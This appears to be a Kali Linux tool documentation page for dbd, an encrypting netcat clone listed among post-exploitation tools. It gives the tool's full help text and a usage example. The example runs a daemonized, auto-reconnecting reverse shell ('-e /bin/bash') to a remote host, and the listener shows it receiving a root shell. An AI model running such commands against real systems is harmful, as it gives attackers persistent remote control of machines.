---
Title: dbd
Homepage: https://github.com/gitdurandal/dbd
Repository: https://gitlab.com/kalilinux/packages/dbd
Architectures: any
Version: 1.50-1kali7
Metapackages: kali-linux-default kali-linux-everything kali-linux-headless kali-linux-large kali-linux-nethunter kali-tools-post-exploitation kali-tools-windows-resources 
Icon: images/dbd-logo.svg
PackagesInfo: |
 ### dbd
 
  dbd is a Netcat-clone, designed to be portable and offer
  strong encryption. It runs on Unix-like operating systems
  and on Microsoft Win32. dbd features AES-CBC-128 +
  HMAC-SHA1 encryption (by Christophe Devine), program
  execution (-e option), choosing source port, continuous
  reconnection with delay, and some other nice features.
  dbd supports TCP/IP communication only. Source code and
  binaries are distributed under the GNU General Public
  License.
 
 **Installed size:** `2.84 MB`  
 **How to install:** `sudo apt install dbd`  
 
 ##### dbd
 
 
 ```
 root@kali:~# dbd -h
 dbd 1.50 Copyright (C) 2013 Kyle Barnthouse <durandal@gitbrew.org>
 $Id: dbd.c,v 1.50 2013/05/20 15:40:00 durandal Exp $
 
 This program is free software; you can redistribute it and/or modify it under
 the terms of the GNU General Public License as published by the Free Software
 Foundation; either version 2 of the License, or (at your option) any later
 version.
 
 connect (tcp): dbd [-options] host port
 listen (tcp):  dbd -l -p port [-options]
 options:
     -l          listen for incoming connection
     -p n        choose port to listen on, or source port to connect out from
     -a address  choose an address to listen on or connect out from
     -e prog     program to execute after connect (e.g. -e cmd.exe or -e bash)
     -r n        infinitely respawn/reconnect, pause for n seconds between
                 connection attempts. -r0 can be used to re-listen after
                 disconnect (just like a regular daemon)
     -c on|off   encryption on/off. specify whether you want to use the built-in
                 AES-CBC-128 + HMAC-SHA1 encryption implementation (by
                 Christophe Devine - http://www.cr0.net:8040/) or not
                 default is: -c on
     -k secret   override default phrase to use for encryption (secret must be
                 shared between client and server)
     -q          hush, quiet, don't print anything (overrides -v)
     -v          be verbose
     -n          toggle numeric-only IP addresses (don't do DNS resolution). if
                 you specify -n twice, original state will be active (i.e. -n
                 works like a on/off switch)
     -m          toggle monitoring (snooping) on/off (only used with the -e
                 option). snooping can also be turned on by specifying -vv (-v
                 two times)
     -P prefix   add prefix (+ a hardcoded separator) to all outbound data.
                 this option is mostly only useful for dbd in "chat mode" (to
                 prefix lines you send with your nickname)
     -H on|off   highlight incoming data with a hardcoded (color) escape
                 sequence (for e.g. chatting). default is: -H off
     -V          print version banner and exit (include that output in your
                 bug report and send bug report to michel.blomgren@tigerteam.se)
 unix-like OS specific options:
     -s          invoke a shell, nothing else. if dbd is setuid 0, it'll invoke
                 a root shell
     -w n        "immobility timeout" in seconds for idle read/write operations
                 and program execution (the -e option)
     -D on|off   fork and run in background (daemonize). default: -D off
 ```
 
 - - -
 
---
{{% hidden-comment "<!--Do not edit anything above this line-->" %}}

## dbd Usage Example

On the client, respawn every 2400 seconds (`-r 2400`), run as a daemon (`-D on`), display verbose output (`-v`), and serve a bash shell (`-e /bin/bash`), connecting to the remote host (`192.168.1.202`) on port 8080 (`8080`).

On the server, listen for a connection (`-l`) on port 8080 (`-p8080`), and display verbose output (-v).

```
root@kali:~# dbd -r 2400 -D on -v -e /bin/bash 192.168.1.202 8080
```


```
root@kali:~# dbd -l -p8080 -v
listening on port 8080
reverse lookup of 192.168.1.202 failed: Unknown server error
connect to 192.168.1.202:8080 from 192.168.1.202:58651 (n/a)
id
uid=0(root) gid=0(root) groups=0(root)
```
